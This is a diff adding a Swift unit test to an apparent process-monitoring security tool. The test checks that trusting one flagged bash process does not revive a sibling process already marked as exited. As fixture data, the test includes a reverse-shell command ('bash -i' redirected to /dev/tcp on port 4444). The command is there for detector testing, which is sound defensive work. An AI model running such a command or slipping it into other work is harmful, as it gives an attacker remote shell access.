@@ -34,6 +34,23 @@ final class SentinelTrustTests: XCTestCase {
         XCTAssertEqual(report.trusted.count, 1)
     }
 
+    func testTrustingOneFindingLeavesItsSiblingsLivenessAlone() async throws {
+        let engine = SentinelEngine(live: .rulesOnly)
+        let browser = process(300, "Google Chrome", chrome)
+        let helper = process(400, "bash", "/bin/bash", command: "bash -c echo hello", parent: 300)
+        let shell = process(401, "bash", "/bin/bash", command: "bash -i >& /dev/tcp/10.0.0.8/4444 0>&1", parent: 300)
+        _ = await engine.ingest(processes: [browser], uiVisible: true, now: now)
+        _ = await engine.ingest(processes: [browser, helper, shell], uiVisible: true, now: now.addingTimeInterval(1))
+        let flagged = await engine.ingest(processes: [browser, helper], uiVisible: true, now: now.addingTimeInterval(2))
+        let finding = try XCTUnwrap(flagged.findings.first { $0.identity.pid == 400 })
+        XCTAssertEqual(flagged.findings.first { $0.identity.pid == 401 }?.isRunning, false)
+
+        _ = await engine.trust(findingID: finding.id)
+        let report = await engine.currentReport
+        XCTAssertEqual(report.findings.map(\.identity.pid), [401])
+        XCTAssertEqual(report.findings.first?.isRunning, false, "the reverse shell exited; trusting another bash must not revive it")
+    }
+
     func testAScriptIsTrustedOnlyWhileItIsTheSameFile() throws {
         let folder = FileManager.default.temporaryDirectory.appendingPathComponent("trust-\(UUID().uuidString)")
         try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
